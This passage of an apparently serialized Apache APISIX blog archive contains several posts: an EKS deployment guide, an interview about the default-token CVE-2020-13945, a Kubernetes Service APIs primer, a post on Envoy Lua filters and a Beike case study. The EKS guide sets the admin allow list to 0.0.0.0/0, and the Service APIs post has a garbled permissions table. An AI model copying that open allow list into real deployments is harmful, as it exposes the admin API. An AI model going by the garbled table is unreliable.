gateway.type=LoadBalancer \\\\\\n  --set allow.ipList=\\"{0.0.0.0/0}\\" \\\\\\n  --namespace ingress-apisix\\nkubectl get service --namespace ingress-apisix\\n```\\n\\nThe above commands created two Kubernetes Service resources, one is `apisix-gateway`, which processes the real traffic; another is `apisix-admin`, which acts as the control plane to process all the configuration changes. Here we created the `apisix-gateway` as a `LoadBalancer` type Service, which resorts the [AWS Network Balancer](https://docs.aws.amazon.com/elasticloadbalancing/latest/network/introduction.html) to expose it to the Internet. You can find the load balancer hostname by the following command:\\n\\n```shell\\nkubectl get service apisix-gateway \\\\\\n--namespace ingress-apisix \\\\\\n-o jsonpath=\'{.status.loadBalancer.ingress[].hostname}\'\\n```\\n\\nAnother thing should be concerned that the `allow.ipList` field should be customized according to the [EKS CIDR Ranges](https://amazonaws-china.com/premiumsupport/knowledge-center/eks-multiple-cidr-ranges/) in your EKS cluster, so that the apisix-ingress-controller can be authorized by Apache APISIX (for the resources pushing).\\n\\nSee [values.yaml](https://github.com/apache/apisix-helm-chart/blob/master/charts/apisix/values.yaml) to learn all the configuration items if you have other requirements.\\n\\n## Install apisix-ingress-controller\\n\\nAfter Apache APISIX is deployed successfully, now it\'s time to install the controller component.\\n\\n```shell\\ncd /path/to/apisix-ingress-controller\\n# install base resources, e.g. ServiceAccount.\\nhelm install ingress-apisix-base -n ingress-apisix ./charts/base\\n# install apisix-ingress-controller\\nhelm install ingress-apisix ./charts/ingress-apisix \\\\\\n  --set ingressController.image.tag=dev \\\\\\n  --set ingressController.config.apisix.baseURL=http://apisix-admin:9180/apisix/admin \\\\\\n  --set ingressController.config.apisix.adminKey={YOUR ADMIN KEY} \\\\\\n  --namespace ingress-apisix\\n```\\n\\nThe ingress-apisix-base chart installed some basic dependencies for apisix-ingress-controller, such as ServiceAccount, its exclusive CRDs and etc.\\n\\nThe ingress-apisix chart guides us how to install the controller itself, you can change the image tag to the desired release version, also the value of `ingressController.config.apisix.adminKey` in above mentioned commands should be filled according to your practical usage (and be sure the admin key is same as the on in Apache APISIX deployment). See [values.yaml](https://github.com/apache/apisix-helm-chart/blob/master/charts/apisix-ingress-controller/values.yaml) to learn all the configuration items if you have other requirements.\\n\\nNow try to open your EKS console, choosing your cluster and clicking the Workloads tag, you shall see all pods of Apache APISIX, etcd and apisix-ingress-controller are ready.\\n\\n## Test\\n\\nNow we have deployed all components in Ingress APISIX, it\'s important to check whether it runs well. We will deploy a httpbin service and ask Apache APISIX to route all requests with Host `\\"local.httpbin.org\\"` to it.\\n\\nThe first step we should do is created the httpbin workload and expose it.\\n\\n```shell\\nkubectl run httpbin --image kennethreitz/httpbin --port 80\\nkubectl expose pod httpbin --port 80\\n```\\n\\nIn order to let Apache APISIX routes requests correctly, we need create an ApisixRoute resource to drive it.\\n\\n```shell\\n# ar-httpbin.yaml\\napiVersion: apisix.apache.org/v1\\nkind: ApisixRoute\\nmetadata:\\n  name: httpserver-route\\nspec:\\n  rules:\\n  - host: local.httpbin.org\\n    http:\\n      paths:\\n      - backend:\\n          serviceName: httpbin\\n          servicePort: 80\\n        path: /*\\n```\\n\\nThe above ApisixRoute resource asks Apache APISIX to route requests which Host header is `\\"local.httpbin.org\\"` to the httpbin backend (the one we just created).\\n\\nNow try to apply it, note the service and the ApisixRoute resource should be put in the same namespace., crossing namespaces is not allowed in apisix-ingress-controller.\\n\\n```shell\\nkubectl apply -f ar-httpbin.yaml\\n```\\n\\nTest it by a simple curl call from a place where the Apache APISIX service is reachable.\\n\\n```shell\\n$ curl http://{apisix-gateway-ip}:{apisix-gateway-port}/headers -s -H \'Host: local.httpbin.org\'\\n\\n{\\n  \\"headers\\": {\\n    \\"Accept\\": \\"*/*\\",\\n    \\"Host\\": \\"httpbin.org\\",\\n    \\"User-Agent\\": \\"curl/7.64.1\\",\\n    \\"X-Amzn-Trace-Id\\": \\"Root=1-5ffc3273-2928e0844e19c9810d1bbd8a\\"\\n  }\\n}\\n```\\n\\nIf the Service type is `ClusterIP,` you have to login to a pod in the EKS cluster, then accessing Apache APISIX with its `ClusterIP` or Service FQDN. If it was exposed (no matter `NodePort` or `LoadBalancer`), just accessing its outside reachable endpoint.\\n\\n## See Also\\n\\n- https://www.apiseven.com/zh/blog/a-first-look-at-kubernetes-service-api\\n- https://www.apiseven.com/zh/blog/another-way-to-implement-envoy-filter\\n- https://github.com/apache/apisix\\n- https://github.com/apache/apisix-helm-chart\\n- https://github.com/apache/apisix-ingress-controller"},{"id":"2021/01/11/interview-apache-apisix-contributor-wang-pengcheng-senior-security-advisor-of-pwc-south-china-data-security-and-privacy-protection-team","metadata":{"permalink":"/blog/2021/01/11/interview-apache-apisix-contributor-wang-pengcheng-senior-security-advisor-of-pwc-south-china-data-security-and-privacy-protection-team","source":"@site/blog/2021/01/11/interview-Apache-APISIX-contributor-Wang-Pengcheng-Senior-Security-Advisor-of-PwC-South-China-Data-Security-and-Privacy-Protection-Team.md","title":"Apache APISIX Contributor Interview | Pengcheng Wang from PricewaterhouseCoopers","description":"PricewaterhouseCoopers reported a vulnerability in the Admin API default token of the API gateway Apache APISIX.","date":"2021-01-11T00:00:00.000Z","formattedDate":"January 11, 2021","tags":[{"label":"Vulnerabilities","permalink":"/blog/tags/vulnerabilities"}],"readingTime":3.06,"truncated":true,"authors":[{"name":"Ming Wen","url":"https://github.com/moonming","imageURL":"https://avatars.githubusercontent.com/u/26448043?v=4"}],"prevItem":{"title":"Run Ingress APISIX on Amazon EKS","permalink":"/blog/2021/01/21/run-ingress-apisix-on-amazon-eks"},"nextItem":{"title":"A First Look at Kubernetes Service APIs","permalink":"/blog/2020/12/18/first-look-at-kubernetes-service-api"}},"content":"> Recently, Pengcheng Wang, a senior security consultant from PwC\'s South China Data Security and Privacy team, reported the first CVE for Apache APISIX to the National Information Security Vulnerability Sharing Platform (CNVD) and the Apache Software Foundation: Apache APISIX Admin API Default Token Vulnerability (CVE-2020- 13945). To thank Pengcheng for his contribution to the Apache APISIX community, we also had an interview with Pengcheng.\\n\\n\x3c!--truncate--\x3e\\n\\n## Contributor Profile\\n\\nPengcheng Wang is a senior security consultant in PwC South China data security and privacy team. He provides data security and privacy compliance consulting, red-blue confrontation, security operations and other technical services for many leading companies, and currently holds many security certifications such as cisp/cisp-pte/cisp-dsg/CEH/iso27701/ccsk.\\n\\n## Interview Text\\n\\n**Editor**: Congratulations to Pengcheng! And thank you for your contribution to the Apache APISIX community! Can you tell us a little bit about yourself and your team?\\n\\n**Pengcheng**: I\'m Pengcheng Wang, from the PwC Guangzhou Data Security and Privacy team, providing data security and privacy consulting services to PwC clients. As a security consultant and open source technology enthusiast, I am quite excited to help the team get the first CVE and also make a little contribution to Apache APISIX.\\n\\n**Editor**: PricewaterhouseCoopers is an accounting firm in most people\'s mind, but I didn\'t expect that it also provides professional security services. How did you learn about Apache APISIX?\\n\\n**Pengcheng**: PwC not only provides traditional financial audit services, but now also provides a series of security testing and privacy compliance consulting services such as security operations, enterprise security consulting, data security and compliance, privacy consulting, Internet of Vehicles, Internet of Things, etc. In the middle of 2020, when we did penetration testing on several clients, we found that they all used Apache APISIX, an open source product as an API gateway. Although this was a new product for us, it was already being used by so many quality customers that we decided to look into the security aspects of Apache APISIX to see if it was reliable and if there were any security vulnerabilities. Then we discovered that there was a fixed token issue that would allow a malicious attacker to take direct control of the API gateway and affect normal business operations. **But in the default configuration of Apache APISIX, this security issue does not arise, and it is only when users change the default control plane IP restrictions without changing the default token that they expose themselves to risk.**\\n\\n**Editor**: Our team also has colleagues from a security background, and we understand how important security is for a product. Are there any other issues with Apache APISIX that you have found in your security testing?\\n\\n**Pengcheng**: Not yet. The previous test was just a shallow security test from a black-box perspective, and we will try to white-box audit the code to see if there are other vulnerabilities from a security perspective. If found, will also be the first time to report to the Apache Software Foundation security department, to contribute to the open source community.\\n\\n**Editor**: Thank you very much to Pengcheng and PwC Guangzhou data security and privacy protection team colleagues! For open source projects, not only is code and documentation a contribution, but reporting on security issues is also a very important contribution! Do you have any plans for follow-up?\\n\\n**Pengcheng**: Our team will actively participate in the Apache APISIX community to help the community prevent and discover security risks as early as possible, so that everyone can use a safe and secure API gateway.\\n\\n## First CVE for Apache APISIX\\n\\nThe first CVE for Apache APISIX: Apache APISIX Admin API Default Token Vulnerability (CVE-2020-13945), see [Security Vulnerability Details](https://nvd.nist.gov/vuln/detail/CVE-2020-13945) for detail.\\n\\n![2021-01-11-1](https://static.apiseven.com/202108/1639461621848-2d567a42-7cab-44ab-8afc-a9c80c8a3ab8.png)"},{"id":"A First Look at Kubernetes Service APIs","metadata":{"permalink":"/blog/2020/12/18/first-look-at-kubernetes-service-api","source":"@site/blog/2020/12/18/first-look-at-kubernetes-service-api.md","title":"A First Look at Kubernetes Service APIs","description":"This article introduces the basic concepts of Kubernetes Service APIs, their main features, and the changes brought about by their implementation.","date":"2020-12-18T00:00:00.000Z","formattedDate":"December 18, 2020","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":6.285,"truncated":true,"authors":[{"name":"Wei Jin","url":"https://github.com/gxthrj","imageURL":"https://avatars2.githubusercontent.com/u/4413028?s=400&u=e140a6d2bf19c426da6498b8888edc96509be649&v=4"}],"prevItem":{"title":"Apache APISIX Contributor Interview | Pengcheng Wang from PricewaterhouseCoopers","permalink":"/blog/2021/01/11/interview-apache-apisix-contributor-wang-pengcheng-senior-security-advisor-of-pwc-south-china-data-security-and-privacy-protection-team"},"nextItem":{"title":"Envoy and Apache APISIX: Another way to implement the Envoy filter","permalink":"/blog/2020/12/16/another-way-to-implement-envoy-filter"}},"content":"> This article provides a basic introduction to the Kubernetes Service APIs by asking questions. As a whole, the Kubernetes Service APIs refine many ingress best practices, such as expression enhancements that actually extend the capabilities of Route, and BackendPolicy objects that can specify almost any Kubernetes backend resource for upstream.\\n\\n\x3c!--truncate--\x3e\\n\\n## Preface\\n\\nThe author is an Apache APISIX PMC and Apache APISIX Ingress Controller Founder. Through research and community communication, I plan to gradually support Kubernetes Service APIs in later versions of Apache APISIX Ingress Controller.\\n\\nAs we know, Kubernetes has a variety of solutions for exposing services inside the cluster, one of which is Ingress, a standard for exposing services to the public, and there are many third-party implementations of Ingress, each with its own technology stack and dependency on gateways that are not compatible with each other.\\n\\nTo unify the various Ingress implementations and facilitate unified management on Kubernetes, the [SIG-NETWORK](https://github.com/kubernetes/community/tree/master/sig-network) community has launched the [Kubernetes Service APIs](https://gateway-api.sigs.k8s.io/), a set of standard implementations called second-generation Ingress.\\n\\n## Topic Description\\n\\nThis article provides an introduction to the basic concepts of Kubernetes Service APIs, starting with a few questions.\\n\\n## Introduction\\n\\n### Kubernetes Service APIs is called the second generation of Ingress technology, in what ways is it better than the first generation\\n\\nThe Kubernetes Service APIs were designed not to be limited to Ingress, but to enhance service networking by focusing on the following points: expressiveness, scalability, and RBAC.\\n\\nFor example, traffic can be managed based on header, weighting\\n\\n```text\\nkind: HTTPRoute\\napiVersion: networking.x-k8s.io/v1alpha1\\n...\\nmatches:\\n  - path:\\n      value: \\"/foo\\"\\n    headers:\\n      values:\\n        version: \\"2\\"\\n  - path:\\n      value: \\"/v2/foo\\"\\n```\\n\\n2. The Service APIs propose the concept of multi-layer APIs, each layer exposes its interface independently to facilitate other custom resources to interface with the APIs and achieve finer granularity (API granularity) control.\\n\\n![api-model](https://gateway-api.sigs.k8s.io/images/api-model.png)\\n\\n3. Role-oriented RBAC: One of the ideas behind the multi-tier API implementation is to design resource objects from the user\'s perspective. These resources are ultimately mapped to common roles for running applications on Kubernetes.\\n\\n## What resource objects are abstracted by the Kubernetes Service APIs\\n\\nThe Kubernetes Service APIs will define the following kinds of resources based on user roles.\\n\\nGatewayClass, Gateway, Route\\n\\n1. GatewayClass defines a set of gateway types with common configuration and behavior\\n\\n- relationship to the Gateway, similar to the ingress.class annotation in ingress.\\n\\n- A GatewayClass defines a set of gateways that share the same configuration and behavior. Each GatewayClass will be handled by a single controller, and controllers have a one-to-many relationship with GatewayClass.\\n\\n- A GatewayClass is a cluster resource. At least one GatewayClass must be defined to have a functional gateway.\\n\\n2. Gateway requests a point at which traffic can be converted to services within the cluster.\\n\\n- Role: Bringing traffic from outside the cluster inside the cluster. This is the true ingress entity.\\n\\n- It defines a request for a specific LB configuration that is also the implementation of the GatewayClass configuration and behavior.\\n\\n- Gateway resources can be created either directly by the operator or by the controller handling the GatewayClass.\\n\\n- Gateway and Route are in a many-to-many relationship.\\n\\n3. the Route describes how traffic passing through the gateway is mapped to a service.\\n\\n![schema-uml](https://gateway-api.sigs.k8s.io/images/schema-uml.svg)\\n\\nIn addition, the Kubernetes Service APIs define a BackendPolicy resource object in order to enable flexible configuration of backend services.\\n\\nThe BackendPolicy object allows you to configure TLS, health checks, and specify the type of backend service, such as service or pod.\\n\\n## What changes will come with the implementation of Kubernetes Service APIs\\n\\nKubernetes Service APIs, as an implementation standard, brings the following changes.\\n\\n1. generality: there can be multiple implementations, just like there are multiple implementations of ingress. ingress controllers can be customized based on the characteristics of the gateway, but they all have a consistent configuration structure. A data structure, you can configure a variety of ingress controller.\\n\\n2. Class concept: GatewayClasses can be configured for different types of load balancing implementations. These class classes allow the user to easily and explicitly understand what functionality can be used as the resource model itself.\\n\\n3. By allowing independent routing resources HTTPRoute to be bound to the same GatewayClass, they can share load balancers and VIPs. layered by user, this allows teams to safely share infrastructure without having to care about the specific implementation of the lower level Gateway. 4.\\n\\n4. backend references with types: With backend references with types, routes can reference Kubernetes Services, or any type of Kubernetes resource designed as a gateway backend, such as a pod, or a statefulset such as a DB, or even an accessible cluster external resource.\\n\\nCross-namespace references: Routes across different namespaces can be bound to a Gateway, allowing access to each other across namespaces. It is also possible to restrict the range of namespaces that a Route under a Gateway can access.\\n\\n## What ingress implementations of Kubernetes Service APIs are currently available\\n\\nThe Ingress that are known to support Kubernetes Service APIs resource objects at the code level are Contour, ingress-gce.\\n\\n## How Kubernetes Service APIs manage resource read and write permissions\\n\\nThe Kubernetes Service APIs are divided into 3 roles based on the user dimension\\n\\n1. infrastructure provider GatewayClass\\n\\n2. cluster operator Gateway\\n\\n3. application developer Route\\n\\nRBAC (Role Based Access Control) is the standard used for Kubernetes authorization. It allows users to configure who can perform operations on a specific range of resources. RBAC can be used to enable each of the roles defined above.\\n\\nIn most cases, all roles are expected to be able to read all resources\\n\\nThe three-tier model has the following write permissions.\\n\\n| | GatewayClass | Gateway | Route |\\n| ----------------------- | ------------ | ------- | ----- |\\n| Infrastructure Provider | Yes | Yes | Yes |\\n| Cluster Operators | No | Yes | Yes | Yes | Application Developers | No | No | No\\n| The Kubernetes Service Provider is a service provider that provides a variety of services to the Kubernetes community.\\n\\n## What are the extension points for Kubernetes Service APIs\\n\\nThe Kubernetes Service APIs refine the multi-tier resource object, but also leave some extension points open.\\n\\nCurrently, the Kubernetes Service APIs are focused on Route.\\n\\n- RouteMatch extends Route matching rules.\\n\\n- Specify Backend extends specific types of backend services, such as file systems, function expressions, etc., in addition to the Kubernetes resources mentioned above.\\n\\n- Route filter adds extensions to the Route lifecycle to handle requests/response.\\n\\n- Custom Route can be fully customized if none of the above extensions are met.\\n\\n## Summary\\n\\nThis article provides a basic introduction to the Kubernetes Service APIs by asking questions. As a whole, the Kubernetes Service APIs refine a lot of ingress best practices, such as the enhancement of expression capabilities, which actually extends the capabilities of the Route, and the BackendPolicy object The Kubernetes Service APIs as a whole refine a lot of ingress best practices, such as the enhanced expressiveness, which actually extends the capabilities of Route, and the BackendPolicy object, which can specify almost all Kubernetes backend resources for upstream. Of course, there are also shortcomings in the early stage of the project. Although the Kubernetes Service APIs have specified the resource objects at a broad level, there are still a lot of details within the resource objects that need to be discussed and then determined to prevent possible conflict scenarios, and there are certain variables in the structure.\\n\\nReference:\\n\\n- https://gateway-api.sigs.k8s.io/\\n- https://www.apiseven.com/zh/blog/a-first-look-at-kubernetes-service-api\\n- https://github.com/apache/apisix\\n- https://github.com/apache/apisix-ingress-controller"},{"id":"Envoy and Apache APISIX: Another way to implement the Envoy filter","metadata":{"permalink":"/blog/2020/12/16/another-way-to-implement-envoy-filter","source":"@site/blog/2020/12/16/another-way-to-implement-envoy-filter.md","title":"Envoy and Apache APISIX: Another way to implement the Envoy filter","description":"This article describes extending Envoy with new functionality and concrete examples using the base library of the cloud-native API gateway Apache APISIX.","date":"2020-12-16T00:00:00.000Z","formattedDate":"December 16, 2020","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":4.72,"truncated":true,"authors":[{"name":"Junxu Chen","url":"https://github.com/nic-chen","imageURL":"https://avatars.githubusercontent.com/u/33000667?v=4"}],"prevItem":{"title":"A First Look at Kubernetes Service APIs","permalink":"/blog/2020/12/18/first-look-at-kubernetes-service-api"},"nextItem":{"title":"Ke Holdings Inc chooses Apache APISIX as API Gateway","permalink":"/blog/2020/12/11/beike-how-to-build-gateway-based-on-apache-apisix"}},"content":"> This article explains how to run Apache APISIX plugins in Envoy.\\n\\n\x3c!--truncate--\x3e\\n\\n> Source: https://www.apiseven.com/en/blog/another-way-to-implement-envoy-filter\\n\\n## Ways to implement Envoy filter\\n\\n### Envoy filter\\n\\nEnvoy is an L7 proxy and communication bus designed for large modern service oriented architectures.\\nA pluggable filter chain mechanism allows filters to be written to perform different tasks and inserted into the main server.\\n\\n![Envoy filter](https://static.apiseven.com/filters.png)\\n\\n### Expansion method\\n\\nThe existing filters may not meet the user\'s custom requirements. In this case, Envoy needs to be extended. Customize new filters according to the existing filter chain to achieve customization requirements.\\n\\nDevelopers can extend Envoy in three ways:\\n\\n|       | Getting Started difficulty |  stability   | development efficiency |          Deploy and compile          |\\n| :---: | :------------------------: | :----------: | :--------------------: | :----------------------------------: |\\n|  C++  |            high            |    stable    |          low           |         long time to compile         |\\n|  Lua  |            low             |    stable    |          High          | no need to compile, deploy directly  |\\n| WASM  |        high-medium         | on the fence |  depends on language   | compilation time depends on language |\\n\\n1. Using C++ to extend\\n\\nIn this way, C++ code is written directly on the basis of Envoy for functional enhancement. After implementing a custom filter, the new binary file is recompiled to complete the upgrade. There are two problems with this way:\\n\\n- Limited by the C++ language, difficulty of getting started, scarcity of developers.\\n\\n- Increasing the complexity of deployment, operation and maintenance, and upgrades. Envoy will become heavier and heavier, and every change requires recompiling the binary file, which is not conducive to iteration and management.\\n\\n2. Using Lua to extend\\n\\nLua is born to be embedded in the application, so as to provide flexible extension and customization features for application, and is widely used.\\n\\nLua Filter allows Lua scripts to be run in the request and response process. The main features currently supported include: inspection of headers, body, and trailers while streaming in either the request flow, response flow;modification of headers and trailers;blocking and buffering the full request/response body for inspection;performing an outbound async HTTP call to an upstream host;performing a direct response and skipping further filter iteration, etc.\\n\\nAt present, many people directly distribute Lua code in configuration, which is not conducive to code organization and management, and it is difficult to share with others to form an ecosystem.\\n\\n3. Using WASM extension\\n\\nDevelopers can write filters in their own programming language, compile them into WASM format using tools, and embed them into Envoy to run.\\n\\nIt currently supports few languages, and using these languages \u200b\u200bto extend is still not that simple. On the other hand, many people still have reservations about WASM and may not directly use it.\\n\\n## Apache APISIX solution\\n\\nBased on the above analysis, we could see that Lua is very suitable for extending Envoy, and it is easy to learn, and the development efficiency is extremely high. Because it is embedded in Envoy, there is no additional network overhead, and the performance is good.\\n\\n[Apache APISIX](https://github.com/apache/apisix) community proposes its own solution based on Lua, which is to provide a powerful and flexible basic library to implement all plugins of Apache APISIX and plugins that will be developed in the future to run on Envoy. Developers could also develop their own customized plugins based on this basic library.\\n\\nApache APISIX is a dynamic, real-time, high-performance API gateway, based on the Nginx library and Lua. Apache APISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more.\\n\\n### Example\\n\\nPlease check the repo for specific code and how to run: [https://github.com/api7/envoy-apisix](https://github.com/api7/envoy-apisix)\\n\\nThe relevant configuration of Envoy is as follows:\\n\\nDefine a Filter:\\n\\n```yaml\\nhttp_filters:\\n- name: entry.lua\\n  typed_config:\\n    \\"@type\\": type.googleapis.com/envoy.extensions.filters.http.lua.v3.Lua\\n    source_codes:\\n      entry.lua:\\n        filename: /apisix/entry.lua\\n```\\n\\nEnable the Filter for a route and configure it with metadata:\\n\\n```yaml\\nroutes:\\n- match:\\n    prefix: \\"/foo\\"\\n  route:\\n    cluster: web_service\\n  typed_per_filter_config:\\n    envoy.filters.http.lua:\\n      \\"@type\\": type.googleapis.com/envoy.extensions.filters.http.lua.v3.LuaPerRoute\\n      name: entry.lua\\n  metadata:\\n    filter_metadata:\\n      envoy.filters.http.lua:\\n        plugins:\\n        - name: uri-blocker\\n          conf:\\n            rejected_code: 403\\n            block_rules:\\n            - root.exe\\n            - root.m+\\n```\\n\\n### How does it work\\n\\nWe don\'t need to make major changes to Envoy, only some optimizations that are suitable for public needs.\\n\\nWe shield platform differences for the plugin layer. All interfaces that need to be used are abstracted in the underlying framework, which we call apisix.core, so that all plugins can run on Envoy and Apache APISIX at the same time.\\n\\n![Architecture diagram](https://static.apiseven.com/main.png)\\n\\nWe use the previous example to show how the plugin runs:\\n\\n![Plugin workflow](https://static.apiseven.com/workflow.png)\\n\\n#### First step, read configuration\\n\\nWe configure through metadata to determine what plugins need to run on each route and what configuration is for each plugin.\\nIn the example, we configured plugin `uri-blocker` for the route whose prefix is \u200b\u200b`/foo`, as well as the block rule of the plugin and the response status when a block is required.\\n\\n#### Second step, parse request\\n\\nWe encapsulated the client request data into `ctx` so that it can be used directly in the entire process.\\n\\n#### Third step, run the plugin\\n\\nWe determine whether we need to block this request by matching the configured rules and the obtained uri. If a block is needed, we call `respond` to directly respond, otherwise we let it go.\\n\\n## Future outlook\\n\\nMore and more APISIX plugins are available to run on Envoy, and finally all APISIX plugins (Even that will be developed in the future) will be available to run on Envoy.\\n\\nAt the same time, we hope that we could work with the Envoy community in the direction of Lua Filter, optimize and improve Lua Filter, enhance the expansion capabilities of Envoy, and reduce the difficulty of Envoy expansion."},{"id":"Ke Holdings Inc chooses Apache APISIX as API Gateway","metadata":{"permalink":"/blog/2020/12/11/beike-how-to-build-gateway-based-on-apache-apisix","source":"@site/blog/2020/12/11/beike-how-to-build-gateway-based-on-apache-apisix.md","title":"Ke Holdings Inc chooses Apache APISIX as API Gateway","description":"Beike chose to use the Apache APISIX as the API gateway, which handles hundreds of millions of traffic every day with excellent and stable performance.","date":"2020-12-11T00:00:00.000Z","formattedDate":"December 11, 2020","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":8.88,"truncated":true,"authors":[{"name":"Hui Wang"}],"prevItem":{"title":"Envoy and Apache APISIX: Another way to implement the Envoy filter","permalink":"/blog/2020/12/16/another-way-to-implement-envoy-filter"}},"content":"> This article describes why Beike chose Apache APISIX as the API gateway at the beginning, and some experiences in the process of using it.\\n\\n\x3c!--truncate--\x3e\\n\\nMy name is Hui Wang, and I am responsible for the development of the API gateway system at Beike. Beike uses Apache APISIX as the API gateway for the production system. It handles over 100 million production traffic every day, with excellent performance and stability. It happens that Apache APISIX has just joined the Apache incubator. In addition to congratulations, I would like to share why Beike chose Apache APISIX at the beginning and some experiences in the process of using it.\\n\\n## Choose Kong or Apache APISIX\\n\\n![Apache APISIX vs Kong in QPS](https://static.apiseven.com/2020/1211/20220816-202641.jpg)\\n\\nFor the technical requirements of the gateway, the first is to have good performance and be able to support the access of large traffic, and the second is to be stable without problems.\\n\\nThe principle of model selection is to reconstruct a more stable version based on or learn from open source projects, which can ensure access to larger traffic. After evaluating the pros and cons, I communicated the idea with the leader, and decided to start it after getting the leader\'s affirmation. At this time, the first thing that comes to mind is Kong, the famous open source gateway. So I went to the official website to browse and read some surrounding articles. The first impression is that this project is very good, it can meet most of the needs of users, and the performance is stable, that\'s it. I cloned the code happily and began to read it. After a long time, I was still confused. Think about it, Kong can provide so many functions, and the complexity of its code can be imagined.\\n\\nAt this time, several questions appeared in my mind. How long can I chew down Kong by myself? And then how long does it take to build a project that suits you? There are so many functions I need?\\n\\nJust a few days ago, the API gateway Apache APISIX version 0.5 was released. I took a look with an understanding mentality and found that it was an open source project jointly developed by the academy student and Wen Ming. With the guarantee of two technical bigwigs, I really wanted to try it out. .\\n\\nWith the attitude of giving it a try, I started to approach Apache APISIX. Due to the short open source time, the supported functions are limited, but basic functions such as dynamic load balancing, circuit breaker, identity authentication, speed limit, etc. have been implemented. At the same time, the amount of code is not very large, which reduces the cost of learning. At this point, PK lost Kong. So on the whole, Apache APISIX is more suitable for my current situation, to meet my initial functional planning, and I don\'t need to consider how to deal with the unneeded functions.\\n\\nThe most critical question, how is the performance of the open source time so short? Looking at the comparison of the stress test data in the same environment, Apache APISIX completely exploded Kong, although this is not fair. After all, Kong is a behemoth, but for my production environment, they are the same. According to the performance test report of Apache APISIX, a single-core CPU can reach 24k QPS, while the latency is only 0.7 milliseconds.\\n\\nIn the end, I chose Apache APISIX for the following reasons:\\n\\n- On the premise that it can meet the needs of the project, the learning cost of Apache APISIX is low\\n- Kong has a huge amount of code, and later maintenance will also bring difficulties\\n- Apache APISIX authors are often active in the OpenResty community with guaranteed code quality\\n- The most important point is to have contact with the author, and you can communicate quickly if you have any questions\\n\\nThe reasons for the APISIX official website are shown in the following figure:\\n\\n![error/Apache APISIX Function](https://static.apiseven.com/202108/1646727279805-b59129ed-4911-4992-9aad-99c44d9b70a5.png)\\n\\n## What capabilities can Apache APISIX provide\\n\\n- Hot Updates and Hot Plugins\\n- Dynamic load balancing\\n- Active and passive health detection\\n- Circuit Breaking\\n- Authentication\\n- Current limit and speed limit\\n- gRPC protocol conversion\\n- Dynamic TCP/UDP, gRPC, websocket, MQTT broker\\n- Dashboard\\n- Prohibited and Permitted List\\n- Serverless\\n\\nApache APISIX has been released nearly ten versions, and it supports far more functions than these. The architecture diagram is drawn according to the business situation, as follows:\\n\\n![error/Apache APISIX Architecture diagram](https://static.apiseven.com/202108/1646727500177-67f887a6-eb40-4a3e-b427-675f6bacbf65.png)\\n\\n## Integrating APISIX Process\\n\\nAfter a few days of code reading, I have a certain understanding of Apache APISIX, but the first problem arises: I have no experience in developing based on open source projects before. How to do it? I created three branches locally, one Apache APISIX branch points to the upstream open source repository, dev is used for regular business iteration, and the master branch is used for online upgrades.\\n\\nAfter two weeks of typing on the keyboard, my \\"Little King Kong\\" finally has some appearance. It\'s time to see how fast it runs and whether it saves fuel. That\'s how the stress test began. The service is deployed on Tencent Cloud with 8 Core and 32 GB emory. The upstream is a real online production environment, so it cannot be pressed too hard. The performance report is as follows:\\n\\n![error/Apache APISIX performance test](https://static.apiseven.com/202108/1646727556563-0db3dab3-8ffb-4db5-8459-14c5f58140be.png)\\n\\nPerformance report summary: The interface time consumption is reduced by 47%, no errors are generated, and the stability is improved. The TPS peak value is increased by 82%, no errors are generated, and the stability is improved.\\n\\nThe development environment is no problem, and we start to study online deployment. Apache APISIX supports various installation methods: Docker, RPM Package, Luarocks and Source Code. However, the online environment does\'t allow anything to be installed, and the code can only be placed in a fixed path. Many features supported by Apache APISIX are based on OpenResty 1.15.8. What should I do? After compiling, put it in the code repository, compile it according to the specified directory, and you cannot use the static binding of pcre, it takes a day or two to get it done. Adjusting the load began to grayscale, and it took a few weeks from 2% traffic to full volume, but fortunately everything went smoothly.\\n\\nAfter several weeks of observation, the online service is very stable. Many functions of Apache APISIX 0.5 must be implemented through API interface calls. The request parameters are prone to syntax errors, and there is no intuitive and convenient page. Another point is that my business scenario needs to have the function of probing upstream services. It\'s such a coincidence that Apache APISIX version 0.7 has been released, and version 0.7 supports console and upstream service exploration. It\'s really good news for everyone, upgrade.\\n\\nThe Apache APISIX branch is easy to upgrade to 0.7, how do I merge the code? The code changes of the two versions are very large. Try to merge them first. There are too many conflicts, and the rhythm is dead. The ordinary method of resolving conflicts is unrealistic. There will be hidden bugs when you shake your hands in so many places. Is there no efficient way? I searched and found the shortcut methods git checkout --ours and git checkout --theirs (search for yourself if you haven\'t used it), and completed the upgrade from APISIX 0.5 to 0.7 in a few minutes. Of course, this is also due to the robustness of APISIX code, I only need to add business plug-ins, completely zero coupling.\\n\\nApache APISIX 0.7 version provides a console, no need to spell json anymore. I quickly tested the health detection function. There was no problem at first, and I could clearly perceive the status of the upstream service. However, when I observed the logs of the upstream service, I found that after several starts and stops, the frequency of the health detection function seems to be faster. It should be that there is a bug in the health check. Simply read the relevant code and find that the checker for each route created is not globally unique, but one is created for each work. The name can be guaranteed to be globally unique. Although the changes are small, a PR was submitted quickly.\\n\\nI upgraded the online business APISIX to 0.7, and then observed the service resource usage. After all, it was a larger version, and I didn\u2019t feel it for the first few hours, which was similar to the previous 0.5. I\'ll take a look at it again when I get off work. It seems that the memory resource usage is not right. The 0.5 version has been relatively stable, but the 0.7 version seems to have leaks. Because the memory usage is growing very slowly, I decided to observe it for another night. The next day, I compared the monitoring data, determined that there was a memory leak, and quickly rolled back to the previous version. I gave feedback to the students about the problem. According to the scenario I described, I found the problem through stress testing. It was a problem with radixtree. The students released a new version of radixtree. I upgraded the dependencies, and then performed stress testing, but the problem did not recur.\\n\\nGoing online again, Apache APISIX 0.7 version still gave me some surprises. The routing dependency used in Apache APISIX 0.5 version was libr3, while Apache APISIX 0.7 used radixtree instead, which has better performance, cpu usage and memory than before. All have declined. In Apache APISIX 0.5, the single-work cpu usage is 1-10%, and the memory is 0.1%. In Apache APISIX 0.7, the single-work cpu usage is reduced to 1-2%, and the memory is less than 0.1%, which is excellent.\\n\\n## Future Plan\\n\\nApache APISIX has been running online for two months, and there has been no online failure. This is the beginning, and we can do a lot in the future to show more capabilities to service providers. The gateway provides not only a reverse proxy, but also helps some teams that do not have more energy to develop functions to ensure service stability, including services such as current limiting, circuit breaker, monitoring, and access platforms. Finally, I would like to thank the two big guys for providing such excellent products, and also thank the Apache APISIX community for the 